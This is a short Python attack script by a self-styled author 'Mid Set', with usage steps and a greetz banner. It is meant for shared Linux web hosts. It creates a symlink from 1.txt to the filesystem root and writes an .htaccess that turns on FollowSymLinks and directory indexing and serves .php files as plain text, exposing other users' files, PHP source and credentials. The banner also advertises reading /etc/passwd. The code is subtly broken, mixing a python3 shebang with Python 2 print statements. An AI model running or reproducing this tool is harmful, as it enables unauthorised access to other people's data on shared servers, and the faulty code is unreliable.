#!/usr/bin/python3
import sys , os
#Important :
#Synlink creator for linux server

#Author : Mid Set
#C0ntact : http://fb.com/midset00

#How To use it ?

#Creat a new dir then upload midset.py on it
#Use this Command : chmod 755 midset.py

#Then : python midset.py
#You will find the symlink of whole server on 1.txt



if sys.platform == 'linux-i386' or sys.platform == 'linux2' or sys.platform == 'darwin':
    SysCls = 'clear'
    symlink = 'ln -s / 1.txt'
    pwd  = ('pwd')

    
os.system(SysCls)
os.system(symlink)
os.system(pwd)

print "\n|---------------------------------------------|"
print "| ##~ Mid Set LoC ReAd                          |"
print "|   2013     midset.py                          |"
print "|    - Symlink creator                          |"
print "| Read /etc/passwd >> passwd.txt                |"
print "| GreeTz : HsN,Hiso,Fat7,vir,Marco,oudouz,D3v.  |"
print "|          All Rights Reserved @ Mid-Set        |"
print "| C0ntact : http://fb.com/midset00              |"
print "|----------------------------------------------|\n"

	    
def main():
    htacess = open ('.htaccess' , 'w')
    inputx = 'Options Indexes FollowSymLinks \nDirectoryIndex ssssss.htm \nAddType txt .php \nAddHandler txt .php'
    htacess.write(inputx)
    
        
print ('Done creating file')
print ('<3 Mid Set <3')

	
if __name__ == "__main__": main()
